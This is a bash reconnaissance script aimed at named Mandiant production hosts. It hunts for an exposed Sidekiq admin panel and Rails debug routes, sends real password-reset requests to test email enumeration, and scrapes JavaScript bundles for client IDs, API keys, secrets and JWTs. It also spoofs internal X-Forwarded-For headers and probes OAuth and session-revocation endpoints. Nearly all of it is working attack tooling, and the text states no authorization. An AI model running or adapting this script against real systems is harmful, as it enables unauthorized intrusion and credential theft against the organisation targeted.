#!/usr/bin/env bash
# mandiant-deep-probe.sh
# Deep investigation of Mandiant targets accessible from the Pi.
# Covers:
#   1. app.validation.mandiant.com — Rails app, Sidekiq, admin panel
#   2. portal-ng.mandiant.com — Angular SPA, JS bundle API extraction
#   3. md.mandiant.com — Managed Defense API, 500 error analysis
#   4. md-us.mandiant.com — US region variant
#
# Run: bash scripts/mandiant-deep-probe.sh
set -euo pipefail

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

OUT="results/mandiant/deep-probe"
mkdir -p "$OUT"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
hit()  { echo -e "${RED}[FOUND]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }
ok()   { echo -e "${GREEN}[OK]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }

echo ""
echo -e "${CYAN}═══ Mandiant Deep Probe ═══${NC}"
echo ""

# ─── 1. app.validation.mandiant.com — Rails / Sidekiq ──────────────────────
info "=== app.validation.mandiant.com — Rails admin surface ==="
echo ""

# Follow Sidekiq redirect fully (up to 10 hops)
info "1.1 Following /sidekiq redirect chain..."
SIDEKIQ_FINAL=$(curl -sk -v --max-redirs 10 \
  -H "User-Agent: $UA" \
  -c /tmp/mandiant_cookies.txt \
  -w "\nHTTP_FINAL:%{http_code}\nURL_FINAL:%{url_effective}" \
  "https://app.validation.mandiant.com/sidekiq" 2>/tmp/sidekiq_verbose.txt)
echo "$SIDEKIQ_FINAL" | tail -5
# Show redirect chain from verbose
grep -iE "< (HTTP|Location)" /tmp/sidekiq_verbose.txt 2>/dev/null | head -20
echo ""

# Check if sidekiq panel is exposed at final URL
SIDEKIQ_BODY=$(curl -sk --max-redirs 10 -H "User-Agent: $UA" \
  -c /tmp/mandiant_cookies.txt \
  "https://app.validation.mandiant.com/sidekiq" 2>/dev/null | head -c 2000)
if echo "$SIDEKIQ_BODY" | python3 -c "
import sys
body = sys.stdin.read()
if any(kw in body for kw in ['Sidekiq', 'sidekiq', 'Queue', 'Workers', 'Processed', 'Enqueued']):
    print('SIDEKIQ_EXPOSED')
elif 'sign_in' in body or 'login' in body.lower():
    print('REDIRECTED_TO_LOGIN')
elif '403' in body or 'Forbidden' in body:
    print('FORBIDDEN')
else:
    print('OTHER: ' + body[:200].replace('\n', ' '))
"; then :; fi
echo ""

# Check registration — /users/sign_up
info "1.2 Check sign-up endpoint (user self-registration?)"
SIGNUP_RESP=$(curl -sk -v --max-redirs 5 \
  -H "User-Agent: $UA" \
  "https://app.validation.mandiant.com/users/sign_up" 2>&1)
SIGNUP_CODE=$(echo "$SIGNUP_RESP" | grep -ioE "< HTTP/[0-9.]+ [0-9]+" | tail -1 | awk '{print $3}')
echo "  /users/sign_up → HTTP $SIGNUP_CODE"
# If 200, check if form allows arbitrary email
echo "$SIGNUP_RESP" | grep -oE 'action="[^"]+"' | head -3
echo ""

# Check forgot password — is email enumeration possible?
info "1.3 Password reset — test for email enumeration"
RESET_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-redirs 5 \
  -H "User-Agent: $UA" \
  "https://app.validation.mandiant.com/users/password/new" 2>/dev/null)
echo "  /users/password/new → HTTP $RESET_CODE"
if [ "$RESET_CODE" = "200" ]; then
  # Get CSRF token from the form
  RESET_CSRF=$(curl -sk --max-redirs 5 -H "User-Agent: $UA" -c /tmp/mandiant_reset_cookies.txt \
    "https://app.validation.mandiant.com/users/password/new" 2>/dev/null \
    | python3 -c "
import sys, re
html = sys.stdin.read()
m = re.search(r'name=\"authenticity_token\"[^>]*value=\"([^\"]+)\"', html)
if m: print(m.group(1))
" 2>/dev/null || echo "")
  echo "  CSRF token: ${RESET_CSRF:0:30}..."

  if [ -n "$RESET_CSRF" ]; then
    # Test: valid Mandiant email → what response?
    info "  Sending reset for test@mandiant.com..."
    RESET_R1=$(curl -sk -v --max-redirs 5 \
      -H "User-Agent: $UA" \
      -b /tmp/mandiant_reset_cookies.txt \
      -c /tmp/mandiant_reset_cookies.txt \
      -X POST \
      -d "authenticity_token=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${RESET_CSRF}'))" 2>/dev/null)&user[email]=test%40mandiant.com" \
      "https://app.validation.mandiant.com/users/password" 2>&1)
    RESET_CODE1=$(echo "$RESET_R1" | grep -ioE "< HTTP/[0-9.]+ [0-9]+" | tail -1 | awk '{print $3}')
    RESET_BODY1=$(echo "$RESET_R1" | tail -50 | head -20)
    echo "  test@mandiant.com → HTTP $RESET_CODE1"
    echo "$RESET_BODY1" | grep -iE "email|not found|sent|error|invalid" | head -5
    echo ""

    # Test: random nonexistent email
    info "  Sending reset for nonexist_xyz_12345@mandiant.com..."
    RESET_R2=$(curl -sk -v --max-redirs 5 \
      -H "User-Agent: $UA" \
      -b /tmp/mandiant_reset_cookies.txt \
      -c /tmp/mandiant_reset_cookies.txt \
      -X POST \
      -d "authenticity_token=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${RESET_CSRF}'))" 2>/dev/null)&user[email]=nonexist_xyz_12345%40mandiant.com" \
      "https://app.validation.mandiant.com/users/password" 2>&1)
    RESET_CODE2=$(echo "$RESET_R2" | grep -ioE "< HTTP/[0-9.]+ [0-9]+" | tail -1 | awk '{print $3}')
    RESET_BODY2=$(echo "$RESET_R2" | tail -50 | head -20)
    echo "  nonexist@mandiant.com → HTTP $RESET_CODE2"
    echo "$RESET_BODY2" | grep -iE "email|not found|sent|error|invalid" | head -5

    # If responses differ, email enumeration is possible
    if [ "$RESET_CODE1" != "$RESET_CODE2" ]; then
      hit "EMAIL ENUMERATION: different status codes ($RESET_CODE1 vs $RESET_CODE2)"
    fi
  fi
fi
echo ""

# Check if there's a GraphQL or API endpoint
info "1.4 API endpoint discovery"
for EP in /api /api/v1 /api/v2 /graphql /api/graphql /api/users /api/assets /api/campaigns; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-redirs 3 \
    -H "User-Agent: $UA" \
    "https://app.validation.mandiant.com${EP}" 2>/dev/null)
  [ "$CODE" != "404" ] && echo "  ${EP} → HTTP $CODE"
done
echo ""

# Rails info endpoints
info "1.5 Rails debug endpoints"
for EP in /rails/info /rails/info/properties /rails/info/routes /rails/mailers \
           /__better_errors /debug /health /status /version; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-redirs 3 \
    -H "User-Agent: $UA" \
    "https://app.validation.mandiant.com${EP}" 2>/dev/null)
  [ "$CODE" != "404" ] && echo "  ${EP} → HTTP $CODE"
done
echo ""

# ─── 2. portal-ng.mandiant.com — Angular SPA bundle analysis ───────────────
info "=== portal-ng.mandiant.com — JS bundle API extraction ==="
echo ""

# Get the index page and extract script URLs
info "2.1 Extracting JS bundle filenames..."
INDEX=$(curl -sk -H "User-Agent: $UA" "https://portal-ng.mandiant.com/" 2>/dev/null)
SCRIPTS=$(echo "$INDEX" | python3 -c "
import sys, re
html = sys.stdin.read()
# Angular chunks
chunks = re.findall(r'src=\"(/[^\"]+\.js[^\"]*)\"|\"(/[a-zA-Z0-9._/-]+\.js)\"', html)
seen = set()
for g in chunks:
    for s in g:
        if s and s not in seen:
            seen.add(s)
            print(s)
" 2>/dev/null || echo "")
echo "$SCRIPTS" | head -20
echo ""

# Download and extract API paths from the main bundle
MAIN_BUNDLE=$(echo "$SCRIPTS" | grep -iE "main|app" | head -1)
if [ -n "$MAIN_BUNDLE" ]; then
  info "2.2 Downloading main bundle: $MAIN_BUNDLE"
  curl -sk -H "User-Agent: $UA" \
    "https://portal-ng.mandiant.com${MAIN_BUNDLE}" 2>/dev/null \
    > "$OUT/main-bundle.js"
  BUNDLE_SIZE=$(wc -c < "$OUT/main-bundle.js")
  echo "  Bundle size: ${BUNDLE_SIZE} bytes"

  info "2.3 Extracting API paths from bundle..."
  python3 << 'PYEOF' 2>/dev/null
import re, json

with open('results/mandiant/deep-probe/main-bundle.js', 'r', errors='ignore') as f:
    content = f.read()

# Find API paths
api_paths = set()
# URL fragments like "/api/v1/something"
for m in re.finditer(r'"(/(?:api|v[0-9]|graphql|rest)[^"]{2,80})"', content):
    api_paths.add(m.group(1))

# GraphQL operation names
gql_ops = set()
for m in re.finditer(r'operationName:\s*"([^"]+)"', content):
    gql_ops.add(m.group(1))

# Hostnames/domains embedded
domains = set()
for m in re.finditer(r'"(https?://[a-zA-Z0-9._-]+\.mandiant\.com[^"]*)"', content):
    domains.add(m.group(1))

# Auth config
auth_config = {}
for m in re.finditer(r'"(client_?id|clientId|audience|domain|scope)":\s*"([^"]+)"', content):
    auth_config[m.group(1)] = m.group(2)

print("=== API Paths ===")
for p in sorted(api_paths)[:50]:
    print(" ", p)

print("\n=== GraphQL Operations ===")
for op in sorted(gql_ops)[:30]:
    print(" ", op)

print("\n=== Embedded Mandiant Domains ===")
for d in sorted(domains)[:20]:
    print(" ", d)

print("\n=== Auth Config ===")
for k, v in auth_config.items():
    print(f"  {k}: {v}")
PYEOF
  echo ""

  # Look for hardcoded secrets/tokens
  info "2.4 Scanning for hardcoded secrets..."
  python3 << 'PYEOF' 2>/dev/null
import re

with open('results/mandiant/deep-probe/main-bundle.js', 'r', errors='ignore') as f:
    content = f.read()

patterns = [
    (r'["\']([A-Za-z0-9_-]{32,})["\']', 'potential_token_32+'),
    (r'(?:api[_-]?key|apikey|api_secret)["\s:=]+["\']([^"\']{16,})["\']', 'api_key'),
    (r'(?:password|passwd|secret)["\s:=]+["\']([^"\']{8,})["\']', 'secret'),
    (r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}', 'jwt_token'),
]

for pattern, label in patterns:
    matches = list(set(re.findall(pattern, content, re.IGNORECASE)))
    if matches and label != 'potential_token_32+':
        print(f"\n[!] {label}:")
        for m in matches[:5]:
            print(f"  {m[:80]}")
    elif label == 'potential_token_32+' and len(matches) > 0:
        # Filter to only interesting ones (not hex hashes or common noise)
        interesting = [m for m in matches if not re.match(r'^[0-9a-f]{32,}$', m) and len(m) > 35][:5]
        if interesting:
            print(f"\n[?] {label}:")
            for m in interesting:
                print(f"  {m[:80]}")
PYEOF
fi
echo ""

# Check for chunks with auth-related names
info "2.5 Checking auth/config related chunks..."
for CHUNK in $(echo "$SCRIPTS" | grep -iE "auth|config|env|settings" | head -5); do
  echo "  Fetching: $CHUNK"
  curl -sk -H "User-Agent: $UA" "https://portal-ng.mandiant.com${CHUNK}" 2>/dev/null \
    | python3 -c "
import sys, re
content = sys.stdin.read()
for m in re.finditer(r'(?:clientId|client_id|domain|audience|issuer)[\"\':\s]+[\"\']([\w._/-]{5,})[\"\'?]', content):
    print(f'  AUTH CONFIG: {m.group(0)[:100]}')
" 2>/dev/null | head -10
done
echo ""

# ─── 3. md.mandiant.com — Managed Defense API analysis ─────────────────────
info "=== md.mandiant.com — Managed Defense backend ==="
echo ""

# Try with X-Forwarded-For and different Content-Type to get different error
info "3.1 Testing with spoofed internal headers..."
for EP in /api/v1/user /api/v1/me /api/user /graphql /api/incidents /api/alerts /api/health; do
  RESP=$(curl -sk -v --max-redirs 3 --max-time 10 \
    -H "User-Agent: $UA" \
    -H "Accept: application/json" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.1" \
    -H "Origin: https://portal-ng.mandiant.com" \
    -H "Referer: https://portal-ng.mandiant.com/" \
    "https://md.mandiant.com${EP}" 2>&1)
  CODE=$(echo "$RESP" | grep -ioE "< HTTP/[0-9.]+ [0-9]+" | tail -1 | awk '{print $3}')
  CT=$(echo "$RESP" | grep -ioE "< content-type: [^\r\n]+" | head -1)
  BODY=$(echo "$RESP" | tail -20 | head -10 | tr -d '\n')
  echo "  ${EP} → HTTP $CODE | $CT | ${BODY:0:80}"
done
echo ""

# Check CORS preflight
info "3.2 CORS preflight from portal-ng origin..."
CORS=$(curl -sk -v --max-redirs 0 --max-time 10 \
  -X OPTIONS \
  -H "Origin: https://portal-ng.mandiant.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization, Content-Type" \
  "https://md.mandiant.com/api/v1/user" 2>&1)
echo "$CORS" | grep -iE "< (HTTP|access-control|vary)" | head -10
echo ""

# Check if 401 vs 403 — 401 means auth required, 403 means access denied (may mean login page exists)
info "3.3 Probing /login on md.mandiant.com..."
for EP in /login /auth /signin /api/auth/signin /api/session; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-redirs 5 \
    -H "User-Agent: $UA" \
    "https://md.mandiant.com${EP}" 2>/dev/null)
  echo "  ${EP} → HTTP $CODE"
done
echo ""

# ─── 4. md-us.mandiant.com — US region variant ─────────────────────────────
info "=== md-us.mandiant.com — US region ==="
echo ""
info "4.1 Comparing API responses vs md.mandiant.com..."
for EP in / /api/user /login; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-redirs 5 \
    -H "User-Agent: $UA" \
    "https://md-us.mandiant.com${EP}" 2>/dev/null)
  echo "  md-us${EP} → HTTP $CODE"
done
echo ""

# ─── 5. advantage.mandiant.com — SOAR/threat intel platform ────────────────
info "=== advantage.mandiant.com — Intelligence Portal ==="
echo ""

info "5.1 API surface mapping..."
ADV_INDEX=$(curl -sk -H "User-Agent: $UA" "https://advantage.mandiant.com/" 2>/dev/null | head -c 3000)
ADV_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://advantage.mandiant.com/" 2>/dev/null)
echo "  / → HTTP $ADV_CODE"
# Extract CSP for backend discovery
ADV_CSP=$(curl -sk -I "https://advantage.mandiant.com/" 2>/dev/null | grep -i "content-security-policy")
echo "  CSP: ${ADV_CSP:0:200}"
echo ""

info "5.2 API endpoint probes..."
for EP in /api /api/v1 /api/v4 /graphql /api/auth /api/users /api/indicators \
          /api/actors /api/reports /api/collections /v4/indicator; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-redirs 3 --max-time 8 \
    -H "User-Agent: $UA" \
    -H "Accept: application/json" \
    "https://advantage.mandiant.com${EP}" 2>/dev/null)
  [ "$CODE" != "404" ] && echo "  ${EP} → HTTP $CODE"
done
echo ""

# ─── 6. auth.mandiant.com — PingFederate OAuth surface ─────────────────────
info "=== auth.mandiant.com — PingFederate OAuth ==="
echo ""

# PingFederate session management - try to access without XSRF
info "6.1 PingFederate session management (unauthenticated)..."
for EP in /pf/heartbeat.ping /pf/adapter/idpadapter/resume \
          /as/authorization.oauth2 /as/.well-known/openid-configuration \
          /pf-ws/rest/sessionMgmt/revokeUserSessionsForUser; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-redirs 3 --max-time 8 \
    -H "User-Agent: $UA" \
    "https://auth.mandiant.com${EP}" 2>/dev/null)
  echo "  ${EP} → HTTP $CODE"
done
echo ""

# Check OIDC discovery for client registration hints
info "6.2 OIDC discovery..."
OIDC=$(curl -sk "https://auth.mandiant.com/.well-known/openid-configuration" 2>/dev/null \
  | python3 -m json.tool 2>/dev/null | head -40)
echo "$OIDC"
echo ""

# ─── Final summary ───────────────────────────────────────────────────────────
echo -e "${CYAN}═══ Summary ═══${NC}"
echo "Results saved to: $OUT/"
ls -la "$OUT/" 2>/dev/null
echo ""
echo "KEY INDICATORS TO CHECK MANUALLY:"
echo "  1. If /sidekiq returned SIDEKIQ_EXPOSED → HIGH: unauthenticated Sidekiq admin panel"
echo "  2. If /users/password showed different responses for valid vs invalid email → Low: email enumeration"
echo "  3. If portal-ng bundle contained client_id/secret/token → Varies: credential disclosure"
echo "  4. If any md.mandiant.com endpoint returned JSON (not 500) → Investigate further"
echo "  5. If auth.mandiant.com OIDC shows registration_endpoint → test dynamic client registration"
